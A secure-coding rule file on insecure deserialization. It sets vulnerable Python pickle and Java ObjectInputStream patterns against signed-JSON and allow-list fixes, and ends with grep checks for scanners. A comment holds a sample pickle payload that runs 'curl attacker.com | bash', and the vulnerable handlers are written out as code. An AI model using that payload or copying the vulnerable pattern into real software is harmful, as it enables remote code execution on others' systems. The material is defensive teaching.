---
id: deserialization-insecure
title: Insecure Deserialization
severity: critical
tags: [deserialization, rce, pickle, java-serialization, yaml, object-injection]
taxonomy: security/deserialization
references:
  - https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
  - https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
---

# Insecure Deserialization

## Description

Deserializing untrusted data using language-native serialization formats (Python pickle, Java serialization, PHP unserialize, Ruby Marshal) allows attackers to execute arbitrary code by crafting malicious serialized objects. This is a critical vulnerability because the code execution happens before any application-level validation.

Key danger: **The attack happens in the deserialization step itself** — the malicious object's methods execute during unpickling/unmarshaling.

## Vulnerable Pattern

```python
# BAD — Python pickle: arbitrary code execution
import pickle, base64
from flask import request

@app.post("/restore-state")
def restore_state():
    data = base64.b64decode(request.get_json()["state"])
    state = pickle.loads(data)  # RCE — pickle executes __reduce__ during load
    return {"state": state}

# Attacker's payload:
# import os, pickle, base64
# class Exploit:
#     def __reduce__(self):
#         return (os.system, ("curl attacker.com | bash",))
# print(base64.b64encode(pickle.dumps(Exploit())))
```

```java
// BAD — Java: ObjectInputStream with untrusted data
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // triggers gadget chains in classpath
```

## Secure Pattern

```python
# GOOD — use JSON for state serialization (no code execution)
import json, hmac, hashlib

SECRET = os.environ["STATE_HMAC_SECRET"]

def serialize_state(state: dict) -> str:
    payload = json.dumps(state)
    signature = hmac.new(SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
    return base64.b64encode(f"{payload}|{signature}".encode()).decode()

def deserialize_state(encoded: str) -> dict:
    decoded = base64.b64decode(encoded).decode()
    payload, signature = decoded.rsplit("|", 1)
    expected = hmac.new(SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature")
    return json.loads(payload)  # safe — no code execution
```

```java
// GOOD — Java: ValidatingObjectInputStream (whitelist classes)
ValidatingObjectInputStream vois = new ValidatingObjectInputStream(inputStream);
vois.accept(AllowedClass.class, AnotherSafeClass.class);  // whitelist only
Object obj = vois.readObject();
```

## Checks to Generate

- Grep for `pickle.loads(`, `pickle.load(` consuming request data or database BLOBs.
- Grep for `marshal.loads(`, `shelve.open(` with external data.
- Grep for `yaml.load(` without `Loader=yaml.SafeLoader` (FullLoader allows object instantiation).
- Flag Java `ObjectInputStream` reading from network streams without class filtering.
- Grep for PHP `unserialize(` on user input — leads to POP chain attacks.
- Flag Ruby `Marshal.load(` on untrusted data.
- Check for `jsonpickle.decode(` on untrusted data — allows object injection.
